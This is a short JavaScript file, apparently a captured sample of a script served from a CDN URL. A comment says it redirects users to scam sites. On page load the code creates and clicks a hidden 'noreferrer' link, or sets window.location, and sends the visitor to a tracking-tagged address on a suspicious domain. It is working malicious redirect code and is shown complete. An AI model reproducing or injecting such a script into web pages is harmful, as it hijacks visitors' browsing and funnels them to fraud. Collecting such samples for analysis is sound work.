// url: https://crazy2cdn.com/js/script.js?cnI9c3E0Y3Q4ZzUmdT1odHRwcyUzQSUyRiUyRnd3dy5rZW50a2FydC5jb20lMkZjb3p1bWxlciUyRm1vYmlsLXV5Z3VsYW1hJTJGJnI9aHR0cHMlM0ElMkYlMkZ3d3cuZ29vZ2xlLmNvbSUyRiZsPXRyLVRS
// redirects user to scam sites
function myGoTo(url) {
	var a = document.createElement("a")
	if (!a.click) {
		window.location = url
		return
	}
	a.setAttribute("href", url)
	a.rel = "noreferrer"
	document.body.appendChild(a)
	a.click()
}
var url = "https://fueltypebel.info/?utm_campaign=y0rsMyowMImIDv9DTSX69oig88PrjKrJ9agQ3DpV-9I1&t=sec"
if (typeof myGoTo === "function" && document.body != null) myGoTo(url)
else window.location = url
